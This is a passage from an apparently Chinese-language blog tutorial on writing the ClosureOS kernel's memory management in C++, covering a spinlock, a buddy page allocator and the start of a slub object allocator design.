class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">volatile</span> base::<span class="hljs-type">int32_t</span> <span class="hljs-type">atomic_t</span>;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> PtrType, <span class="hljs-keyword">typename</span> OldValType, <span class="hljs-keyword">typename</span> NewValType&gt;<br><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">atomic_compare_and_swap</span><span class="hljs-params">(PtrType ptr, OldValType oldval, NewValType newval)</span> -&gt; <span class="hljs-type">bool</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> __sync_bool_compare_and_swap(ptr, oldval, newval);<br>&#125;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> PtrType, <span class="hljs-keyword">typename</span> NewValType&gt;<br><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">atomic_set</span><span class="hljs-params">(PtrType ptr, NewValType newval)</span> -&gt; <span class="hljs-keyword">auto</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> __sync_lock_test_and_set(ptr, newval);<br>&#125;<br><br><span class="hljs-comment">/* ... */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPINLOCK_LOCKED 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPINLOCK_FREE 0</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SpinLock</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">SpinLock</span>();<br>    ~<span class="hljs-built_in">SpinLock</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Lock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">TryLock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">bool</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">UnLock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Reset</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">atomic_t</span> counter;<br>&#125;;<br><br>SpinLock::<span class="hljs-built_in">SpinLock</span>()<br>&#123;<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">Reset</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SpinLock::Lock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">atomic_compare_and_swap</span>(&amp;<span class="hljs-keyword">this</span>-&gt;counter, SPINLOCK_FREE, SPINLOCK_LOCKED)) &#123;<br>        <span class="hljs-comment">/* infinite waiting looooop... */</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SpinLock::TryLock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">bool</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">atomic_compare_and_swap</span>(&amp;<span class="hljs-keyword">this</span>-&gt;counter, SPINLOCK_FREE, SPINLOCK_LOCKED);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SpinLock::UnLock</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">atomic_set</span>(&amp;<span class="hljs-keyword">this</span>-&gt;counter, SPINLOCK_FREE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SpinLock::Reset</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">atomic_set</span>(&amp;<span class="hljs-keyword">this</span>-&gt;counter, SPINLOCK_FREE);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x02-页级内存分配器：buddy-算法"><a href="#0x02-页级内存分配器：buddy-算法" class="headerlink" title="0x02. 页级内存分配器：buddy 算法"></a>0x02. 页级内存分配器：buddy 算法</h1><p>我们按惯例将内核侧的内存分配分为两部分：一部分是以内存页为单位的粗粒度页级内存分配器，另一部分是从页级内存分配器分配内存页后再将其划分为更多小对象的细粒度内存分配器，本节我们将实现页级内存分配器</p><p><strong>伙伴算法</strong> （ buddy memory allocation ）是笔者所见过的几种页级内存管理算法当中 <strong>比较优雅的一种</strong> ，因此在 ClosureOS 当中我们的页级内存分配器也采用这种算法，我们将这一内存分配器称为 <code>buddy system</code></p><p>我们使用 <code>struct page</code> 结构体来管理空闲的内存页，并将连续的空闲内存页进行分阶 （order） 管理，一份 N 阶的空闲内存页表示 <code>2^N</code> 张连续的空闲内存页，最高阶设为 <code>10</code> ，位于同一阶的空闲内存页通过第一张页的 <code>list</code> 字段连接为双向链表</p><p><img src="https://s2.loli.net/2024/06/22/XRFtE7I5NxB4hyv.png"></p><p>相同阶的两份页面互相称为 buddy，为了方便进行页面管理，简化页面分配模型， <strong>我们将一份 buddy pages 限制为页框号在</strong> <code>1 &lt;&lt; order</code> <strong>上分别为 0 与 1 的两份页面</strong> ：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">buddy_page_pfn</span><span class="hljs-params">(<span class="hljs-type">pfn_t</span> pfn, <span class="hljs-type">int</span> order)</span> -&gt; base::<span class="hljs-type">size_t</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> pfn ^ (<span class="hljs-number">1</span> &lt;&lt; order);<br>&#125;<br><br><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">get_page_buddy</span><span class="hljs-params">(Page *p, <span class="hljs-type">int</span> order)</span> -&gt; Page*</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">pfn_t</span> pfn = <span class="hljs-built_in">page_to_pfn</span>(p);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">pfn_to_page</span>(<span class="hljs-built_in">buddy_page_pfn</span>(pfn, order));<br>&#125;<br></code></pre></td></tr></table></figure><p>在上层，我们将单个页级内存池封装为一个 <code>PagePool</code> 类，其通过一个自旋锁确保内存分配的线程安全，空闲内存页按照其所属的阶链接到各自所属的空闲双向链表中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">constexpr</span> base::<span class="hljs-type">size_t</span> MAX_PAGE_ORDER = <span class="hljs-number">11</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PagePool</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">PagePool</span>(<span class="hljs-type">void</span>);<br>    ~<span class="hljs-built_in">PagePool</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">AllocPages</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> order)</span> -&gt; Page *</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">FreePages</span><span class="hljs-params">(Page *page, base::<span class="hljs-type">size_t</span> order)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br>    <span class="hljs-comment">/* for booting stage only */</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">AddPages</span><span class="hljs-params">(Page *page, base::<span class="hljs-type">size_t</span> order)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    lib::ListHead freelist[MAX_PAGE_ORDER];<br>    lib::atomic::SpinLock lock;<br><br>    <span class="hljs-keyword">auto</span> __reinit_page(Page *p, base::<span class="hljs-type">size_t</span> order, <span class="hljs-type">bool</span> free) -&gt; <span class="hljs-type">void</span>;<br><br>    <span class="hljs-keyword">auto</span> __alloc_page_direct(base::<span class="hljs-type">size_t</span> order) -&gt; Page *;<br>    <span class="hljs-keyword">auto</span> __alloc_pages(base::<span class="hljs-type">size_t</span> order) -&gt; Page *;<br><br>    <span class="hljs-keyword">auto</span> __free_pages(Page *p, base::<span class="hljs-type">size_t</span> order) -&gt; <span class="hljs-type">void</span>;<br><br>    <span class="hljs-keyword">auto</span> __reclaim_memory(<span class="hljs-type">void</span>) -&gt; <span class="hljs-type">void</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="内存页分配：对齐到-2-N-张页，拆高阶页面"><a href="#内存页分配：对齐到-2-N-张页，拆高阶页面" class="headerlink" title="内存页分配：对齐到 2^N 张页，拆高阶页面"></a>内存页分配：对齐到 2^N 张页，拆高阶页面</h2><p>buddy 算法中的分配流程如下：</p><ul><li>首先会将请求的内存大小向 2 的幂次方张内存页大小对齐，之后从对应的下标取出连续内存页，若成功取到则直接返回</li><li>若对应下标链表为空，则会从下一个 order 中取出内存页，一分为二，其中一份装载到当前下标对应链表中，另一份再返还给上层调用，若下一个 order 也为空则会继续向更高的 order 进行该请求过程，直到成功分配或超过最高阶</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> PagePool::__alloc_page_direct(base::<span class="hljs-type">size_t</span> order) -&gt; Page *<br>&#123;<br>    Page *p = <span class="hljs-literal">nullptr</span>;<br>    Page *buddy;<br>    base::<span class="hljs-type">size_t</span> allocated = order;<br><br>    <span class="hljs-keyword">while</span> (allocated &lt; MAX_PAGE_ORDER) &#123;<br>        <span class="hljs-keyword">if</span> (!lib::<span class="hljs-built_in">list_empty</span>(&amp;<span class="hljs-keyword">this</span>-&gt;freelist[allocated])) &#123;<br>            p = lib::<span class="hljs-built_in">list_entry</span>(<span class="hljs-keyword">this</span>-&gt;freelist[allocated].next, &amp;Page::list);<br>            lib::<span class="hljs-built_in">list_del</span>(&amp;p-&gt;list);<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            allocated++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* failed */</span><br>    <span class="hljs-keyword">if</span> (!p) &#123;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">/* it means that we acquire pages from higher order */</span><br>    <span class="hljs-keyword">if</span> (allocated != order) &#123;<br>        <span class="hljs-comment">/* put half pages back to buddy */</span><br>        <span class="hljs-keyword">do</span> &#123;<br>            allocated--;<br>            buddy = <span class="hljs-built_in">get_page_buddy</span>(p, allocated);<br>            <span class="hljs-keyword">this</span>-&gt;__reinit_page(buddy, allocated, <span class="hljs-literal">true</span>);<br>            lib::<span class="hljs-built_in">list_add_next</span>(&amp;<span class="hljs-keyword">this</span>-&gt;freelist[allocated], &amp;buddy-&gt;list);<br>        &#125; <span class="hljs-keyword">while</span> (allocated &gt; order);<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;__reinit_page(p, allocated, <span class="hljs-literal">false</span>);<br><br>out:<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>完成内存页分配之后，我们还需要完成对分配的这一组内存页的标记，对于一份 <code>order=N</code> 的连续内存页，我们以其首页作为标识，其余页面则作为附属页，我们通过 <code>is_head</code> 标志位进行标识，并使用一个额外的 order 字段存储当前页面所属连续内存页的 order：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> PagePool::__reinit_page(Page *p, base::<span class="hljs-type">size_t</span> order, <span class="hljs-type">bool</span> free) -&gt; <span class="hljs-type">void</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">1</span> &lt;&lt; order); i++) &#123;<br>        p[i].is_free = free;<br>        p[i].order = order;<br>        p[i].freelist = <span class="hljs-literal">nullptr</span>;<br>        p[i].kc = <span class="hljs-literal">nullptr</span>;<br>        p[i].is_head = <span class="hljs-literal">false</span>;<br>        lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;p-&gt;ref_count, <span class="hljs-number">-1</span>);<br>        lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;p-&gt;map_count, <span class="hljs-number">-1</span>);<br>    &#125;<br><br>    p[<span class="hljs-number">0</span>].is_head = <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>此外，我们设计一个增加页面引用计数的 API ，当页面被引用时我们应当调用该函数增加其引用计数，在 ClosureOS 开发规范中我们应当在分配页面后调用该 API 增加引用计数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">get_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Page *p)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    lib::atomic::<span class="hljs-built_in">atomic_inc</span>(&amp;<span class="hljs-built_in">get_head_page</span>(p)-&gt;ref_count);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内存页释放：检测相邻空闲页组，-向上合并"><a href="#内存页释放：检测相邻空闲页组，-向上合并" class="headerlink" title="内存页释放：检测相邻空闲页组， 向上合并"></a>内存页释放：检测相邻空闲页组， 向上合并</h2><p>buddy 算法的内存页释放流程如下：</p><ul><li>检查同一 order 的物理相邻高地址页面，若为空闲则将其脱链，合并成为一份新 pages</li><li>否则，检查同一 order 的物理相邻低地址页面，若为空闲则将其脱链，合并成为一份新 pages</li><li>order 增加，进入下一轮循环直到超过最大 order 或是同一 order 的前向与后向页面都非空闲</li><li>更新所有子页面信息，最后将页面挂到对应 order 的空闲页面链表上</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> PagePool::__free_pages(Page *p, base::<span class="hljs-type">size_t</span> order) -&gt; <span class="hljs-type">void</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!p) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (order &gt;= MAX_PAGE_ORDER) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">Lock</span>();<br><br>    <span class="hljs-comment">/* try to combine nearby pages */</span><br>    <span class="hljs-keyword">while</span> (order &lt; (MAX_PAGE_ORDER - <span class="hljs-number">1</span>)) &#123;<br>        Page *buddy;<br><br>        buddy = <span class="hljs-built_in">get_page_buddy</span>(p, order);<br>        <span class="hljs-keyword">if</span> (buddy-&gt;type == PAGE_NORMAL_MEM &amp;&amp; buddy-&gt;is_head &amp;&amp; buddy-&gt;is_free) &#123;<br>            <span class="hljs-built_in">list_del</span>(&amp;buddy-&gt;list);<br>            <span class="hljs-keyword">if</span> (buddy &lt; p) &#123;<br>                p-&gt;is_head = <span class="hljs-literal">false</span>;<br>                p = buddy;<br>            &#125;<br>            order++;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* we can&#x27;t combine forward or backward, just break */</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;__reinit_page(p, order, <span class="hljs-literal">true</span>);<br><br>    <span class="hljs-built_in">list_add_next</span>(&amp;(<span class="hljs-keyword">this</span>-&gt;freelist[order]), &amp;p-&gt;list);<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">UnLock</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>不过我们在 ClosureOS 中通常 <strong>并不直接调用页面释放的这个 API</strong> ，而是根据引用计数的减少来决定是否该释放页面，在引用计数减少为负数值时自动释放该页面，从而将引用计数管理与页面释放相统一，而无需开发者手动检查：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">put_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Page *p)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    p = <span class="hljs-built_in">get_head_page</span>(p);<br><br>    <span class="hljs-keyword">if</span> (lib::atomic::<span class="hljs-built_in">atomic_dec</span>(&amp;p-&gt;ref_count) &lt; <span class="hljs-number">0</span>) &#123;<br>        p-&gt;pool-&gt;<span class="hljs-built_in">FreePages</span>(p, p-&gt;order);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是，目前还只是比较简陋的基础设计，尚未加入各种异常检测（例如 <code>page::ref_count</code> 小于 <code>-1</code> 的情况），我们将在后续添加上完整的错误处理系统（例如 <code>kernel panic</code> ）后再行补充</p><h1 id="0x03-通用内存分配器：slub-算法"><a href="#0x03-通用内存分配器：slub-算法" class="headerlink" title="0x03. 通用内存分配器：slub 算法"></a>0x03. 通用内存分配器：slub 算法</h1><blockquote><p>注：本章我们 <strong>暂时不考虑动态虚拟内存分配</strong> （即传统的 <code>vmalloc()</code> ），仅考虑基于直接映射区的内存分配</p></blockquote><p>现在我们基于页级内存分配器进行小对象分配器的设计：小对象分配器会先从 buddy system 分配页面，将其分割为多个小对象后，再将符合要求的内存对象返还给上层调用</p><p>对于小对象分配器，我们使用 <strong>slub allocator</strong> ——这是一种应用于 Linux kernel 中的久经检验的内存分配算法，其核心思想如下：</p><ul><li>我们将不同大小的内存对象请求归到不同的内存池进行处理，例如对于大小为 <code>16</code> 字节的内存请求从 <code>kmalloc-16</code> 这一内存池进行分配，对于非对齐的内存分配大小则向上对齐到相应的内存池进行分配</li><li>不同的内存池独立持有一组页面，在需要时自行向 buddy system 进行内存分配请求</li><li>内存池向 buddy system 单次请求得到的一份连续内存页称为 <code>slub</code> ，一张 <code>slub</code> 会被分割为多个相同大小的小内存对象，空闲内存对象间连接成单向链表结构</li></ul><p>slub allocator 的好处在于 <strong>我们并不需要额外的数据字段去记录每个内存对象的状态信息</strong> ，我们使用 direct mapping area 的地址来分割 slub pages，由此很容易能根据内存对象的地址获取到其所属的页面与对应的 <code>page</code> 结构体，同时使用链表组织空闲对象可以让我们很方便地得知当前 slub pages 的状态</p><p>我们使用 <code>page</code> 结构体中的一个字段记录其对应的 slub pages 的空闲对象链表，基本结构如下图所示：</p><p><img src="https://s2.loli.net/2024/06/30/p1Ho9Vv5AWiNlXD.png"></p><blockquote><p>为什么使用二阶指针？主要是因为笔者个人比较喜欢的一种链表迭代写法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">page-&gt;freelist = *page-&gt;freelist;<br></code></pre></td></tr></table></figure></blockquote><p>然后是内存池结构的设计，我们使用一个 <code>class KMemCache</code> 结构定义一个指定大小的内存池，并为每个内存池设计两个链表：</p><ul><li><code>full</code> ：这个链表上的 slub pages 没有空闲对象</li><li><code>partial</code> 这个链表上的 slub pages 有一定的空闲对象</li></ul><p>此外，我们在 <code>KMemCache</code> 中记录其所需的 slub pages 上的对象数量等信息</p><blockquote><p>注：本章我们暂时不考虑针对多核的优化策略（如 cpu 独占的 <code>KMemCacheCPU</code> ），等到后期如果笔者还有精力再行优化：）</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* size-specific memory pool, front end of PagePool */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">KMemCache</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">KMemCache</span>(<span class="hljs-type">void</span>);<br>    ~<span class="hljs-built_in">KMemCache</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Malloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span>*</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Free</span><span class="hljs-params">(Page *page, <span class="hljs-type">void</span> *obj)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">AddPool</span><span class="hljs-params">(PagePool *pool)</span> -&gt; <span class="hljs-type">bool</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">RemovePool</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> index)</span> -&gt; PagePool*</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Init</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> obj_sz)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">/* pages pool backend */</span><br><br>    PagePool *pools[CACHE_POOL_MAX_NR];<br>    base::<span class="hljs-type">size_t</span> pool_nr;<br>    base::<span class="hljs-type">size_t</span> order;<br><br>    <span class="hljs-keyword">auto</span> __internal_page_alloc(<span class="hljs-type">void</span>) -&gt; Page*;<br>    <span class="hljs-keyword">auto</span> __page_obj_slicing(Page* page) -&gt; <span class="hljs-type">void</span>;<br><br>    <span class="hljs-comment">/* caches front end */</span><br><br>    base::<span class="hljs-type">size_t</span> page_obj_nr;<br>    base::<span class="hljs-type">size_t</span> obj_sz;<br>    Page *current;<br>    lib::ListHead partial;<br>    lib::ListHead full;<br>    <span class="hljs-type">void</span> **freelist;<br><br>    <span class="hljs-keyword">auto</span> __internal_obj_alloc(<span class="hljs-type">void</span>) -&gt; <span class="hljs-type">void</span>*;<br>    <span class="hljs-keyword">auto</span> __internal_obj_free(Page *page, <span class="hljs-type">void</span> *obj) -&gt; <span class="hljs-type">void</span>;<br><br>    <span class="hljs-comment">/* infrastructure */</span><br><br>    lib::atomic::SpinLock lock;<br>&#125;;<br><br><br><span class="hljs-keyword">enum</span> &#123;<br>    KOBJECT_16 = <span class="hljs-number">0</span>,<br>    KOBJECT_32,<br>    KOBJECT_64,<br>    KOBJECT_128,<br>    KOBJECT_192,<br>    KOBJECT_256,<br>    KOBJECT_512,<br>    KOBJECT_1K,<br>    KOBJECT_2K,<br>    KOBJECT_4K,<br>    KOBJECT_8K, <span class="hljs-comment">/* max allocation for 2 pages */</span><br>    NR_KOBJECT_SIZE,<br>&#125;;<br><br><span class="hljs-comment">/* static memory initializer to avoid constructor to be existed */</span><br>base::<span class="hljs-type">uint8_t</span> GloblKMemCacheGroupMem[KOBJECT_SIZE_NR][<span class="hljs-built_in">sizeof</span>(KMemCache)];<br>KMemCache *GloblKMemCacheGroup[KOBJECT_SIZE_NR] = &#123;<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_16],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_32],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_64],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_128],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_192],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_256],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_512],<br>    (KMemCache*) 